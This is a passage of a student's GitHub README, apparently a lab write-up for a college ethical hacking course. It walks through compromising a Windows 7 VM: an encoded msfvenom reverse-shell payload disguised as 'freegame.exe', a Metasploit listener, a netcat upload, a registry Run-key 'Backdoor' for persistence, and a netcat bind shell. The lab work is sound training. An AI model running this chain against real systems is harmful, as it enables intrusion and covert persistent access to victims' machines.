@@ -227,3 +227,277 @@ sudo unicornscan -mT 10.0.0.1/24 -p 139 -Iv -r 200 -s 192.168.1.2
 
 [![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0A66C2?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/sudip-pokhrel-3375291b3/)
 [![GitHub](https://img.shields.io/badge/GitHub-Follow-181717?style=flat-square&logo=github&logoColor=white)](https://github.com/sudippokhrel33513)
+
+
+# 💀 Exploitation & Post-Exploitation Lab (Lab 06)
+
+> **Fanshawe College — Ethical Hacking and Exploits**
+> A full end-to-end exploitation lab using Metasploit Framework, Meterpreter, and Netcat to compromise a Windows 7 target, establish persistence, and manage remote access — all within an isolated VMware lab environment.
+
+---
+
+## 🛠️ Tools Used
+
+![Metasploit](https://img.shields.io/badge/Metasploit-2596CD?style=flat-square&logo=metasploit&logoColor=white)
+![Kali Linux](https://img.shields.io/badge/Kali_Linux-557C94?style=flat-square&logo=kalilinux&logoColor=white)
+![VMware](https://img.shields.io/badge/VMware-607078?style=flat-square&logo=vmware&logoColor=white)
+![Windows](https://img.shields.io/badge/Windows_7-0078D6?style=flat-square&logo=windows&logoColor=white)
+
+| Tool | Purpose |
+|---|---|
+| **Metasploit Framework (msfvenom)** | Generate malicious payload (.exe) |
+| **multi/handler** | Listen for incoming reverse shell connection |
+| **Meterpreter** | Post-exploitation shell on target |
+| **Netcat (nc.exe)** | Upload and establish persistent backdoor |
+| **Windows Registry (regedit)** | Set backdoor to run on startup |
+
+---
+
+## 🖥️ Lab Environment
+
+- **Attacker:** Kali Linux 2022.3 (`10.0.0.99`) — VMware Workstation
+- **Target:** Windows 7 (`10.0.0.7`) — VMware Workstation
+- **Attack Type:** Client-side exploit via malicious executable + reverse TCP shell
+- **Persistence Method:** Windows Registry `HKLM\...\Run` key
+
+---
+
+## 📌 Attack Stages & Screenshots
+
+---
+
+### Stage 1 — Payload Generation with msfvenom
+
+**Objective:** Create a malicious Windows executable that connects back to the attacker when run on the target.
+
+**Command used:**
+```bash
+msfvenom -p windows/meterpreter_reverse_tcp \
+  LHOST=10.0.0.99 LPORT=4444 \
+  -e x86/shikata_ga_nai -i 1 \
+  -f exe -o /var/www/html/freegame.exe
+```
+
+**What happened:**
+- `msfvenom` generated a reverse TCP Meterpreter payload disguised as `freegame.exe`
+- Encoder `x86/shikata_ga_nai` was applied (1 iteration) to obfuscate the payload
+- Final payload size: **175,715 bytes** | Final exe size: **250,880 bytes**
+- Saved to `/var/www/html/` so it can be served via the web server for the victim to download
+- `uname -a` confirms the attacker machine: Kali Linux 5.18.0 x86_64
+
+![msfvenom Payload Generation](Lab06/lab06-slide-1.jpg)
+
+---
+
+### Stage 2 — Setting Up the Listener & Getting a Shell
+
+**Objective:** Configure Metasploit's `multi/handler` to catch the reverse connection when the victim runs the payload.
+
+**Commands used:**
+```bash
+use exploit/multi/handler
+set payload windows/meterpreter_reverse_tcp
+set lhost 10.0.0.99
+exploit
+```
+
+**What happened:**
+- Reverse TCP handler started on `10.0.0.99:4444`
+- When the victim ran `freegame.exe`, a **Meterpreter session** was opened:
+  `10.0.0.99:4444 → 10.0.0.7:49159`
+- `meterpreter > shell` dropped into a full Windows command shell
+- `dir` confirmed we are inside `C:\Users\User\Desktop\` on the Windows 7 target
+- `meterpreter > background` sent the session to background for further tasks
+
+![Metasploit Listener & Meterpreter Session](Lab06/lab06-slide-2.jpg)
+
+---
+
+### Stage 3 — File Upload & Filesystem Navigation
+
+**Objective:** Upload tools to the target and explore the filesystem.
+
+**Commands used:**
+```bash
+upload /usr/share/windows-resources/binaries/nc.exe c:\
+meterpreter > shell
+cd \
+dir
+```
+
+**What happened:**
+- `nc.exe` (Netcat) was uploaded from Kali to the target's `C:\` drive
+- First upload attempt failed (`spokhrel.txt` — wrong path), second succeeded
+- After dropping into a Windows shell, navigated to `C:\` root using `cd ..` commands
+- `dir` output confirmed `nc.exe` (59,392 bytes) now exists on the target alongside system files:
+  - `7z920.exe`, `autoexec.bat`, `config.sys`, `nc.exe`, `spokhrel.txt`
+
+![File Upload via Meterpreter](Lab06/lab06-slide-3.jpg)
+
+---
+
+### Stage 4 — Registry Persistence (Backdoor)
+
+**Objective:** Make the backdoor survive reboots by adding it to the Windows startup registry key.
+
+**Commands used:**
+```bash
+meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \
+  -v Backdoor -d C:\\nc.exe
+
+meterpreter > background
+msf6 exploit(multi/handler) > sessions -k 1
+msf6 exploit(multi/handler) > date && hostname
+```
+
+**What happened:**
+- A registry key `Backdoor` was set under `HKLM\...\CurrentVersion\Run` pointing to `C:\nc.exe`
+- This ensures `nc.exe` launches automatically every time Windows boots
+- Session was killed (`sessions -k 1`) to simulate the victim restarting their machine
+- `date && hostname` confirmed attacker system info: `spokhrel157855`, Oct 21 2023
+
+![Registry Persistence Setup](Lab06/lab06-slide-4.jpg)
+
+---
+
+### Stage 5 — Verifying Persistence on the Target (Windows Registry Editor)
+
+**Objective:** Confirm on the Windows 7 machine that the backdoor registry key was successfully written.
+
+**What was shown:**
+- Windows Registry Editor open at `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+- **Backdoor** key visible with data value `C:\nc.exe` — confirming successful persistence
+- `nc.exe` also launched automatically (visible as a black window in the background)
+- Command prompt shows `net config workstation | find "name"`:
+  - Computer name: `\\SPOKHREL157855-W7`
+  - Full name: `spokhrel157855-W7`
+  - Username: `User`
+
+![Registry Verification on Windows 7](Lab06/lab06-slide-5.jpg)
+
+---
+
+### Stage 6 — Reconnection & Backdoor Cleanup
+
+**Objective:** Reconnect to the target after reboot using the persistent backdoor, then clean up traces.
+
+**Commands used:**
+```bash
+use exploit/multi/handler
+set payload windows/meterpreter_reverse_tcp
+set lhost 10.0.0.99
+exploit
+
+meterpreter > reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
+```
+
+**What happened:**
+- After the Windows 7 machine rebooted, `nc.exe` auto-launched (due to the Run key)
+- Metasploit caught the incoming reverse connection — **Meterpreter session 1 opened** again
+- `reg enumkey` listed the Run values: `VMware User Process` and `Backdoor`
+- `reg deleteval -v Backdoor` successfully removed the backdoor from the registry
+- Output: `Successfully deleted Backdoor.` — simulating post-pentest cleanup
+
+![Reconnection and Backdoor Removal](Lab06/lab06-slide-6.jpg)
+
+---
+
+### Stage 7 — Advanced Registry Manipulation
+
+**Objective:** Demonstrate setting a registry value with advanced flags and verifying it.
+
+**Commands used:**
+```bash
+meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \
+  -v Backdoor -d C:\\nc.exe -ldp 1234 -e cmd.exe
+
+meterpreter > reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \
+  -v Backdoor
+```
+
+**Results:**
+- Registry key successfully set with value `1234`
+- `reg queryval` confirmed:
+  - Key: `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
+  - Name: `Backdoor`
+  - Type: `REG_SZ`
+  - Data: `1234`
+- Bottom terminal: `uname -a && date` shows Kali Linux attacker system timestamp: Oct 21 2023
+
+![Advanced Registry Manipulation](Lab06/lab06-slide-7.jpg)
+
+---
+
+### Stage 8 — Netcat Persistent Access & Final Verification
+
+**Objective:** Use Netcat directly to connect to the backdoor on the target machine and verify full access.
+
+**Commands used:**
+```bash
+nc 10.0.0.7 1234
+cd \
+dir
+exit
+date
+uname -a
+```
+
+**What happened:**
+- Netcat connected directly to Windows 7 (`10.0.0.7`) on port `1234`
+- Full Windows command shell obtained — `Microsoft Windows [Version 6.1.7600]`
+- `dir C:\` listing confirmed all files on the target:
+  - `7z920.exe`, `autoexec.bat`, `config.sys`, `nc.exe`, `spokhrel.txt`
+  - Directories: `PerfLogs`, `Program Files`, `Security`, `Users`, `Windows`
+- Successfully exited and returned to Kali
+- Final `uname -a` confirms Kali Linux 5.18.0 attacker system: Oct 24 2023
+
+![Netcat Persistent Access](Lab06/lab068.jpg)
+
+---
+
+## 🔁 Full Attack Chain Summary
+
+```
+[1] msfvenom → generate freegame.exe (reverse TCP payload)
+      ↓
+[2] Victim runs freegame.exe → Meterpreter session opened
+      ↓
+[3] Upload nc.exe to C:\ on target via Meterpreter
+      ↓
+[4] Write nc.exe to HKLM\...\Run registry key (persistence)
+      ↓
+[5] Verify registry key on Windows 7 (regedit)
+      ↓
+[6] Kill session → target reboots → nc.exe auto-runs
+      ↓
+[7] Meterpreter re-connects → verify & clean registry
+      ↓
+[8] Netcat connects directly to backdoor port 1234
+```
+
+---
+
+## 📚 Key Takeaways
+
+- `msfvenom` can create encoded payloads disguised as legitimate files to bypass basic defenses
+- **Reverse TCP shells** initiate the connection from the victim → attacker, bypassing firewalls
+- **Meterpreter** provides a powerful post-exploitation framework (upload, shell, registry control)
+- **Registry Run keys** are a classic persistence mechanism in Windows environments
+- **Netcat** (`nc.exe`) is a lightweight tool for maintaining persistent access via raw TCP
+- Proper pentest cleanup includes removing backdoors, registry keys, and uploaded files
+
+---
+
+## ⚠️ Disclaimer
+
+> All activities were performed in a **controlled, isolated VMware lab environment** for educational purposes as part of the Fanshawe College Information Security Management program. No real systems were targeted or harmed.
+
+---
+
+## 👨‍💻 Author
+
+**Sudip Pokhrel** | Cybersecurity & IT Support Enthusiast
+
+[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0A66C2?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/sudip-pokhrel-3375291b3/)
+[![GitHub](https://img.shields.io/badge/GitHub-Follow-181717?style=flat-square&logo=github&logoColor=white)](https://github.com/sudippokhrel33513)
